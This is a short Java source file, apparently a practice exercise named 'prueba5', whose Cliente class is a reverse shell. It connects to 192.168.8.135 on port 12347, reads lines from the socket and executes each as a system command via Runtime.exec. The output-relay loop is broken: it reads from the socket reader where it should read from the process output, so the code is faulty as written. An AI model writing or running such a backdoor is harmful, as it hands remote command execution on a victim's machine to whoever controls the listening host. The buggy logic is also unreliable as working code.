package prueba5;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class Cliente {
    public static void main(String[] args) {
        try{
            Socket socket = new Socket("192.168.8.135", 12347);
            OutputStream os = socket.getOutputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String comando;
            while ((comando = br.readLine()) != null) {
                Process process = Runtime.getRuntime().exec(comando);
                BufferedReader brComando = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String linea;
                while ((linea = br.readLine()) != null) {
                    os.write(linea.getBytes());
                    os.write('\n');
                }
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
